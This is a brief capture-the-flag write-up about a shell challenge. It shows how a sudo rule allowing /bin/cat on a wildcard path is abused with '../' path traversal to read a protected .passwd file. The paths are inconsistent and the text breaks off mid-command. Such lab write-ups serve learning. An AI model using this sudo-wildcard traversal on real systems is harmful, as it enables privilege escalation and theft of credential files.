After read the readme.md and investigate the directories
it's a good idea run 'sudo -l' to know what we can do.

Find:

"User app-script-ch1 may run the following commands on challenge02:
(app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*"

So, with 'sudo -u app-script-ch1-cracked' we can execute car on the 'notes' directory. 

Let's to try:

ls notes

cat notes/shared_notes #permission denied

sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/shared_notes

It works. But the .passwd file is in /challenge/app-script/ch1/ch1cracked that is fully-permission-denied.

When you want to go back, you do:

cd .. or cd ../..

So we can try to acces the 'ch1script' folder with the user 'app-script-cracked' with whom we have permissions on the 'notes' folder
by cating the some file from the 'notes' dir with a relativ path like: /challenge/app-script/ch1/notes/../ch1/cracked/.........
